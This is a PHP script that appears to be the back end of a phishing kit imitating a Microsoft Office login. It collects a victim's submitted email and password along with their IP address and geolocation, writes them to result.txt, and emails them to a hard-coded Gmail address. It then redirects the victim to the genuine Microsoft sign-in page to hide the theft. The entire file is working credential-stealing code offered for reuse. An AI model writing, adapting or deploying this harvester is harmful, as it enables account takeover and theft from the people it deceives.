<?php
if($_POST["userid"] != "" and $_POST["pass"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "--------------0nline Inf0-----------------------\n";
$message .= "Email            : ".$_POST['userid']."\n";
$message .= "Password           : ".$_POST['pass']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------Unknown-------------\n";
//change ur email here
$send = "ivamko333@gmail.com";
$subject = "$geoplugin->countryName .$ip.";
$file = fopen("result.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$message\r\n");
fputs ($file, "--------\r\n");
fclose ($file);
$headers = "From: 0ffice<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$praga=rand();
$praga=md5($praga);
     header("Location: https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3d1d7fIHbS39W1dylPNH-JCBAPmQXKz8TsNsIosZ8cpKLD-bU5TRvDUMq3zvVBqUK3ZV10v0Nc9C4TOd93cGJo6b5hNZIFKmsx77MCYoeV3wyEeVTFV4uyM2F0Keww76TX&nonce=636516900962501689.NjI2ZDFmZjQtOWFmYy00ZTc2LThlYTAtZDE5NTMwMWFlZjVkNmJjMmFlZDgtMDQ3OS00ZWQzLWJhZDctNjZlZGE3OGM5MDkw&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-ZA&mkt=en-ZA ");
}else{
header("Location: index.php");
}

?>
